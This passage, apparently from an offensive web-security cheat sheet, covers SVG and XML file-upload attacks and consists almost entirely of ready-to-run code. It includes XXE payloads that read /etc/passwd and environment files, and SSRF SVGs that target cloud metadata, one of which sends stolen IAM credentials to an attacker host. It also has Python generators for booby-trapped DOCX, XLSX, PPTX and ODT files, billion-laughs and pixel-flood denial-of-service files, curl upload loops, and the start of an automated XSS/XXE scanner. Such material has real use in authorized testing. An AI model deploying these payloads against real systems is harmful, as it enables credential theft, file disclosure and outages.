  </svg>
  ```

  ```bash
  # Upload error-based XXE and check response for leaked data
  cat > error_xxe.svg << 'SVGEOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100"/>
  </svg>
  SVGEOF

  RESPONSE=$(curl -s -X POST https://target.com/upload \
    -F "file=@error_xxe.svg;type=image/svg+xml" -b "session=COOKIE")

  # Search response for error messages containing file content
  echo "$RESPONSE" | grep -iE "error|exception|failed|unable|cannot|invalid|warning"
  ```
  :::
::

---

## SSRF via SVG Rendering

When a server renders SVG to raster images (for thumbnails, previews, or format conversion), external resources referenced in the SVG are fetched by the server. This creates SSRF opportunities even without XXE.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Image Reference SSRF"}
  ```xml
  <!-- === <image> with xlink:href SSRF === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
       width="500" height="500">
    <image xlink:href="http://169.254.169.254/latest/meta-data/" width="500" height="500"/>
  </svg>

  <!-- === <image> with href (SVG 2.0) === -->
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <image href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="500" height="500"/>
  </svg>

  <!-- === Multiple SSRF targets in one SVG === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
       width="500" height="2000">
    <image xlink:href="http://169.254.169.254/latest/meta-data/" x="0" y="0" width="500" height="200"/>
    <image xlink:href="http://169.254.169.254/latest/user-data" x="0" y="200" width="500" height="200"/>
    <image xlink:href="http://127.0.0.1:8080/" x="0" y="400" width="500" height="200"/>
    <image xlink:href="http://127.0.0.1:3000/" x="0" y="600" width="500" height="200"/>
    <image xlink:href="http://ATTACKER.com/ssrf-callback" x="0" y="800" width="500" height="200"/>
  </svg>

  <!-- === Recursive SVG loading (SVG references another SVG) === -->
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="http://ATTACKER.com/redirect_to_metadata.svg" width="500" height="500"/>
  </svg>
  <!-- ATTACKER.com/redirect_to_metadata.svg redirects to 169.254.169.254 -->
  ```

  ```bash
  # Upload SSRF SVG and check listener
  cat > ssrf_render.svg << 'SVGEOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
       width="500" height="500">
    <image xlink:href="http://ATTACKER_IP:8888/ssrf-render-callback" width="500" height="500"/>
  </svg>
  SVGEOF

  # Start listener
  python3 -m http.server 8888 &

  curl -X POST https://target.com/upload \
    -F "file=@ssrf_render.svg;type=image/svg+xml" -b "session=COOKIE"

  # If server renders SVG to thumbnail → your listener receives request
  # Check: Server IP, User-Agent (may reveal rendering engine)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Stylesheet & Font SSRF"}
  ```xml
  <!-- === External stylesheet fetch === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <?xml-stylesheet type="text/css" href="http://169.254.169.254/latest/meta-data/"?>
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100" fill="red"/>
  </svg>

  <!-- === CSS @import SSRF === -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <style>
      @import url("http://169.254.169.254/latest/meta-data/");
    </style>
    <rect width="100" height="100"/>
  </svg>

  <!-- === External font loading SSRF === -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <defs>
      <style>
        @font-face {
          font-family: 'ssrf';
          src: url('http://169.254.169.254/latest/meta-data/');
        }
        text { font-family: 'ssrf'; }
      </style>
    </defs>
    <text x="10" y="50">SSRF via font</text>
  </svg>

  <!-- === External filter/pattern reference === -->
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <defs>
      <filter id="f1">
        <feImage xlink:href="http://169.254.169.254/latest/meta-data/" result="bg"/>
      </filter>
    </defs>
    <rect width="500" height="500" filter="url(#f1)"/>
  </svg>

  <!-- === SVG <use> external reference SSRF === -->
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <use xlink:href="http://169.254.169.254/latest/meta-data/#x"/>
  </svg>

  <!-- === feImage filter primitive SSRF === -->
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <filter id="ssrf">
      <feImage xlink:href="http://ATTACKER.com/ssrf-feimage"/>
    </filter>
    <rect width="500" height="500" filter="url(#ssrf)"/>
  </svg>
  ```

  ```bash
  # Test all SVG SSRF vector types
  SSRF_TARGET="http://ATTACKER_IP:8888"

  VECTORS=(
    "image_href:<image xlink:href=\"${SSRF_TARGET}/v_image\" width=\"100\" height=\"100\"/>"
    "stylesheet:<?xml-stylesheet href=\"${SSRF_TARGET}/v_stylesheet\"?>"
    "css_import:<style>@import url(\"${SSRF_TARGET}/v_css\")</style>"
    "font_face:<defs><style>@font-face{font-family:x;src:url(${SSRF_TARGET}/v_font)}</style></defs><text font-family=\"x\">t</text>"
    "feimage:<filter id=\"f\"><feImage xlink:href=\"${SSRF_TARGET}/v_feimage\"/></filter><rect filter=\"url(#f)\" width=\"100\" height=\"100\"/>"
    "use:<use xlink:href=\"${SSRF_TARGET}/v_use#x\"/>"
  )

  for vector_str in "${VECTORS[@]}"; do
    name="${vector_str%%:*}"
    content="${vector_str#*:}"
    
    cat > "ssrf_${name}.svg" << SVGEOF
  <?xml version="1.0"?>
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
    ${content}
  </svg>
  SVGEOF

    curl -s -X POST "https://target.com/upload" \
      -F "file=@ssrf_${name}.svg;type=image/svg+xml" -b "session=COOKIE" > /dev/null
    echo "Uploaded: ssrf_${name}.svg → Check listener for /v_${name}"
    rm -f "ssrf_${name}.svg"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="foreignObject SSRF"}
  ```xml
  <!-- === foreignObject with iframe SSRF === -->
  <!-- When server uses headless browser (Chrome, Puppeteer) to render SVG -->
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <iframe src="http://169.254.169.254/latest/meta-data/" width="500" height="500"></iframe>
      </body>
    </foreignObject>
  </svg>

  <!-- === foreignObject with img SSRF === -->
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <img src="http://169.254.169.254/latest/user-data"/>
      </body>
    </foreignObject>
  </svg>

  <!-- === foreignObject with link preload SSRF === -->
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/"/>
        <script src="http://169.254.169.254/latest/user-data"></script>
      </body>
    </foreignObject>
  </svg>

  <!-- === foreignObject with fetch (headless Chrome) === -->
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <script>
          fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
            .then(r => r.text())
            .then(d => {
              fetch('http://ATTACKER.com/exfil', {
                method: 'POST',
                body: d
              });
            });
        </script>
      </body>
    </foreignObject>
  </svg>
  ```
  :::
::

---

## XXE via XML-Based File Formats

::note
Many common file formats are ZIP archives containing XML files. By modifying the internal XML, you can inject XXE payloads that trigger when the server processes the document.
::

::accordion
  :::accordion-item{icon="i-lucide-file-text" label="DOCX (Word) XXE"}
  DOCX files are ZIP archives containing XML files like `[Content_Types].xml`, `word/document.xml`, and various relationship files. Injecting XXE into any of these XML files may trigger when the server processes the document for preview, conversion, or metadata extraction.

  ```bash
  # === Step 1: Create or use a legitimate DOCX ===
  # You can create one with LibreOffice or use any existing .docx

  # === Step 2: Extract DOCX ===
  mkdir docx_work && cd docx_work
  cp /path/to/legit.docx evil.docx
  unzip evil.docx -d extracted/
  cd extracted/

  # === Step 3: Inject XXE into [Content_Types].xml ===
  cat > '[Content_Types].xml' << 'XXEOF'
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <!DOCTYPE Types [
    <!ENTITY xxe SYSTEM "http://ATTACKER_IP:8888/xxe-docx-content-types">
  ]>
  <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
    <Override PartName="/xxe" ContentType="&xxe;"/>
  </Types>
  XXEOF

  # === Alternative: Inject into word/document.xml ===
  # Add DTD to the beginning of word/document.xml
  # This is more likely to be parsed during content extraction

  # === Step 4: Inject XXE for file read ===
  cat > '[Content_Types].xml' << 'XXEOF'
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <!DOCTYPE Types [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="&xxe;"/>
    <Default Extension="xml" ContentType="application/xml"/>
  </Types>
  XXEOF

  # === Step 5: Repack DOCX ===
  zip -r ../evil_xxe.docx .

  # === Step 6: Upload ===
  cd ..
  curl -X POST https://target.com/upload \
    -F "file=@evil_xxe.docx;type=application/vnd.openxmlformats-officedocument.wordprocessingml.document" \
    -b "session=COOKIE" -v

  # === Step 7: Check for data exfiltration ===
  # Check your listener for callbacks
  # Check the upload response for file contents
  # Check any preview/thumbnail generated from the document

  # === Automated DOCX XXE Generator ===
  python3 << 'DOCXEOF'
  import zipfile
  import os
  import shutil

  def create_xxe_docx(output_file, xxe_target, method="callback"):
      """Create a DOCX with XXE payload"""
      
      if method == "callback":
          content_types = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <!DOCTYPE Types [
    <!ENTITY xxe SYSTEM "{xxe_target}">
  ]>
  <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
    <Override PartName="/xxe" ContentType="&xxe;"/>
  </Types>'''
      elif method == "fileread":
          content_types = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <!DOCTYPE Types [
    <!ENTITY xxe SYSTEM "file://{xxe_target}">
  ]>
  <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="&xxe;"/>
    <Default Extension="xml" ContentType="application/xml"/>
  </Types>'''

      document = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body><w:p><w:r><w:t>Test</w:t></w:r></w:p></w:body>
  </w:document>'''

      rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
  </Relationships>'''

      word_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>'''

      with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as z:
          z.writestr('[Content_Types].xml', content_types)
          z.writestr('_rels/.rels', rels)
          z.writestr('word/document.xml', document)
          z.writestr('word/_rels/document.xml.rels', word_rels)
      
      print(f"Created: {output_file}")

  # Generate callback DOCX
  create_xxe_docx("xxe_callback.docx", "http://ATTACKER_IP:8888/xxe-docx", "callback")

  # Generate file read DOCX
  create_xxe_docx("xxe_fileread.docx", "/etc/passwd", "fileread")

  # Generate multiple for different targets
  targets = ["/etc/passwd", "/etc/hostname", "/var/www/html/.env", "/proc/self/environ"]
  for t in targets:
      safe = t.replace("/", "_")
      create_xxe_docx(f"xxe{safe}.docx", t, "fileread")
  DOCXEOF
  ```
  :::

  :::accordion-item{icon="i-lucide-table" label="XLSX (Excel) XXE"}
  ```bash
  # XLSX files have the same ZIP+XML structure as DOCX
  # Key XML files: [Content_Types].xml, xl/workbook.xml, xl/sharedStrings.xml

  # === Quick XLSX XXE Generator ===
  python3 << 'XLSXEOF'
  import zipfile

  def create_xxe_xlsx(output_file, xxe_target):
      content_types = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <!DOCTYPE Types [
    <!ENTITY xxe SYSTEM "{xxe_target}">
  ]>
  <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
    <Override PartName="/xxe" ContentType="&xxe;"/>
  </Types>'''

      workbook = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <sheets><sheet name="Sheet1" sheetId="1" r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/></sheets>
  </workbook>'''

      sheet = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <sheetData><row r="1"><c r="A1" t="s"><v>0</v></c></row></sheetData>
  </worksheet>'''

      shared_strings = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
    <si><t>Test</t></si>
  </sst>'''

      rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
  </Relationships>'''

      wb_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
    <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings" Target="sharedStrings.xml"/>
  </Relationships>'''

      with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as z:
          z.writestr('[Content_Types].xml', content_types)
          z.writestr('_rels/.rels', rels)
          z.writestr('xl/workbook.xml', workbook)
          z.writestr('xl/_rels/workbook.xml.rels', wb_rels)
          z.writestr('xl/worksheets/sheet1.xml', sheet)
          z.writestr('xl/sharedStrings.xml', shared_strings)
      
      print(f"Created: {output_file}")

  create_xxe_xlsx("xxe_callback.xlsx", "http://ATTACKER_IP:8888/xxe-xlsx")
  create_xxe_xlsx("xxe_passwd.xlsx", "file:///etc/passwd")
  XLSXEOF

  # Upload
  curl -X POST https://target.com/import \
    -F "file=@xxe_callback.xlsx;type=application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" \
    -b "session=COOKIE"
  ```
  :::

  :::accordion-item{icon="i-lucide-rss" label="RSS / Atom / SOAP / XML Feed XXE"}
  ```xml
  <!-- === RSS Feed XXE === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <rss version="2.0">
    <channel>
      <title>&xxe;</title>
      <link>http://example.com</link>
      <description>XXE Test Feed</description>
      <item>
        <title>&xxe;</title>
        <link>http://example.com/item1</link>
        <description>&xxe;</description>
      </item>
    </channel>
  </rss>

  <!-- === Atom Feed XXE === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE feed [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <feed xmlns="http://www.w3.org/2005/Atom">
    <title>&xxe;</title>
    <entry>
      <title>&xxe;</title>
      <summary>&xxe;</summary>
    </entry>
  </feed>

  <!-- === SOAP Request XXE === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
      <data>&xxe;</data>
    </soap:Body>
  </soap:Envelope>

  <!-- === XLIFF Translation File XXE === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE xliff [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
    <file source-language="en" target-language="fr">
      <body>
        <trans-unit id="1">
          <source>&xxe;</source>
        </trans-unit>
      </body>
    </file>
  </xliff>

  <!-- === GPX (GPS Data) XXE === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE gpx [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <gpx version="1.1" xmlns="http://www.topografix.com/GPX/1/1">
    <wpt lat="0" lon="0">
      <name>&xxe;</name>
    </wpt>
  </gpx>

  <!-- === KML (Google Earth) XXE === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE kml [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <kml xmlns="http://www.opengis.net/kml/2.2">
    <Document>
      <name>&xxe;</name>
    </Document>
  </kml>

  <!-- === Sitemap XML XXE === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE urlset [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
    <url>
      <loc>&xxe;</loc>
    </url>
  </urlset>

  <!-- === XSLT XXE / RCE === -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE xsl [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
      <output>&xxe;</output>
    </xsl:template>
  </xsl:stylesheet>
  ```

  ```bash
  # Upload various XML format payloads
  FORMATS=(
    "xxe_rss.xml:application/rss+xml"
    "xxe_atom.xml:application/atom+xml"
    "xxe_soap.xml:text/xml"
    "xxe_xliff.xlf:application/xliff+xml"
    "xxe_gpx.gpx:application/gpx+xml"
    "xxe_kml.kml:application/vnd.google-earth.kml+xml"
    "xxe_sitemap.xml:application/xml"
    "xxe_xslt.xsl:application/xslt+xml"
  )

  for format_pair in "${FORMATS[@]}"; do
    filename="${format_pair%%:*}"
    mimetype="${format_pair#*:}"
    if [ -f "$filename" ]; then
      STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
        -F "file=@$filename;type=$mimetype" -b "session=COOKIE" 2>/dev/null)
      echo "$filename ($mimetype) → HTTP $STATUS"
    fi
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-image" label="PPTX / ODT / ODS XXE"}
  ```bash
  # === PPTX XXE ===
  python3 << 'PPTXEOF'
  import zipfile

  content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <!DOCTYPE Types [
    <!ENTITY xxe SYSTEM "http://ATTACKER_IP:8888/xxe-pptx">
  ]>
  <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="xml" ContentType="application/xml"/>
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Override PartName="/ppt/presentation.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"/>
    <Override PartName="/xxe" ContentType="&xxe;"/>
  </Types>'''

  presentation = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"
   xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <p:sldMasterIdLst/>
    <p:sldIdLst/>
  </p:presentation>'''

  rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="ppt/presentation.xml"/>
  </Relationships>'''

  with zipfile.ZipFile('xxe.pptx', 'w', zipfile.ZIP_DEFLATED) as z:
      z.writestr('[Content_Types].xml', content_types)
      z.writestr('_rels/.rels', rels)
      z.writestr('ppt/presentation.xml', presentation)
      z.writestr('ppt/_rels/presentation.xml.rels', '''<?xml version="1.0"?>
  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>''')

  print("Created xxe.pptx")
  PPTXEOF

  # === ODT (OpenDocument Text) XXE ===
  python3 << 'ODTEOF'
  import zipfile

  content = '''<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE office:document-content [
    <!ENTITY xxe SYSTEM "http://ATTACKER_IP:8888/xxe-odt">
  ]>
  <office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
   xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
    <office:body>
      <office:text>
        <text:p>&xxe;</text:p>
      </office:text>
    </office:body>
  </office:document-content>'''

  manifest = '''<?xml version="1.0" encoding="UTF-8"?>
  <manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0">
    <manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.text"/>
    <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
  </manifest:manifest>'''

  with zipfile.ZipFile('xxe.odt', 'w') as z:
      z.writestr('mimetype', 'application/vnd.oasis.opendocument.text')
      z.writestr('content.xml', content)
      z.writestr('META-INF/manifest.xml', manifest)

  print("Created xxe.odt")
  ODTEOF

  # Upload all office format XXE payloads
  for doc in xxe.docx xxe.xlsx xxe.pptx xxe.odt; do
    if [ -f "$doc" ]; then
      STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
        -F "file=@$doc" -b "session=COOKIE" 2>/dev/null)
      echo "$doc → HTTP $STATUS"
    fi
  done
  ```
  :::
::

---

## SVG Denial of Service

::collapsible
**SVG-based DoS vectors to test (use responsibly on authorized targets)**

```xml
<!-- === Billion Laughs (XML Bomb) via SVG === -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&lol9;</text>
</svg>
<!-- Expands ~3GB from a few KB file -->

<!-- === Quadratic Blowup Attack === -->
<!-- More subtle than Billion Laughs, harder to detect -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</text>
</svg>

<!-- === Recursive External Entity (if external entities allowed) === -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://ATTACKER.com/recursive.xml">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
<!-- recursive.xml references itself → infinite loop -->

<!-- === Massive SVG Dimensions (Pixel Flood) === -->
<svg xmlns="http://www.w3.org/2000/svg" width="100000" height="100000">
  <rect width="100000" height="100000" fill="red"/>
</svg>
<!-- Server tries to render 100000x100000 pixel image → OOM -->

<!-- === Deeply Nested Elements === -->
<!-- Generate with: python3 -c "print('<svg xmlns=\"http://www.w3.org/2000/svg\">' + '<g>'*50000 + '<rect width=\"1\" height=\"1\"/>' + '</g>'*50000 + '</svg>')" -->
```

```bash
# Generate pixel flood SVG
cat > dos_pixel_flood.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="99999" height="99999">
  <rect width="99999" height="99999" fill="red"/>
</svg>
EOF

# Generate deeply nested SVG
python3 -c "
depth = 10000
svg = '<svg xmlns=\"http://www.w3.org/2000/svg\">'
svg += '<g>' * depth
svg += '<rect width=\"1\" height=\"1\"/>'
svg += '</g>' * depth
svg += '</svg>'
with open('dos_nested.svg', 'w') as f:
    f.write(svg)
print(f'Created dos_nested.svg with {depth} nesting levels')
"

# Upload DoS payloads (use with caution!)
curl -X POST https://target.com/upload \
  -F "file=@dos_pixel_flood.svg;type=image/svg+xml" -b "session=COOKIE" --max-time 30
```
::

---

## Comprehensive Automated Scanner

::code-collapse
```python [SVG & XML Payload Scanner]
#!/usr/bin/env python3
"""
SVG & XML Upload Vulnerability Scanner
Tests XSS, XXE, SSRF via SVG and XML-based file uploads

Usage:
  python3 svg_xml_scanner.py \
    --url https://target.com/upload \
    --cookie "session=abc123" \
    --callback http://YOUR_IP:8888 \
    --field file
"""

import requests
import argparse
import time
import io
import base64
import hashlib
import zipfile
import urllib3
urllib3.disable_warnings()

class SVGXMLScanner:
    def __init__(self, url, cookie, callback, field="file", upload_dir=None, proxy=None):
        self.url = url
        self.field = field
        self.callback = callback
        self.upload_dir = upload_dir
        self.session = requests.Session()
        self.session.verify = False
        
        for c in cookie.split(";"):
            if "=" in c:
                k, v = c.strip().split("=", 1)
                self.session.cookies.set(k, v)
        
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        
        self.results = {"uploaded": [], "xss_candidates": [], "xxe_candidates": [], "ssrf_candidates": []}

    def upload(self, filename, content, mime="image/svg+xml"):
        try:
            files = {self.field: (filename, io.BytesIO(content.encode() if isinstance(content, str) else content), mime)}
            r = self.session.post(self.url, files=files, timeout=15)
            return r.status_code, r.text
        except Exception as e:
            return 0, str(e)

    def test(self, name, filename, content, mime="image/svg+xml", category="unknown"):
        status, body = self.upload(filename, content, mime)
        uploaded = status in [200, 201, 204] and "error" not in body.lower()[:300]
        
        if uploaded:
            self.results["uploaded"].append(name)
            self.results[f"{category}_candidates"].append(name)
            print(f"  [✓ UPLOADED] {name}")
        else:
            print(f"  [✗ BLOCKED]  {name} (HTTP {status})")
        
        return uploaded

    def run_xss_tests(self):
        print("\n" + "=" * 60)
        print("  SVG XSS PAYLOAD TESTS")
        print("=" * 60)
        
        xss_payloads = {
            "onload_basic": '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>',
            "script_tag": '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>',
            "script_cdata": '<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[alert(document.domain)]]></script></svg>',
            "foreignObject": '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="500" height="500"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(document.domain)</script></body></foreignObject></svg>',
            "animate_onbegin": '<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(1)" attributeName="x" dur="1s"/></svg>',
            "set_onbegin": '<svg xmlns="http://www.w3.org/2000/svg"><set onbegin="alert(1)" attributeName="x" to="1"/></svg>',
            "animateTransform": '<svg xmlns="http://www.w3.org/2000/svg"><animateTransform onbegin="alert(1)" attributeName="transform" type="rotate" dur="1s"/></svg>',
            "animateMotion": '<svg xmlns="http://www.w3.org/2000/svg"><animateMotion onbegin="alert(1)" dur="1s" path="M0,0"/></svg>',
            "a_javascript": '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)"><rect width="500" height="500"/></a></svg>',
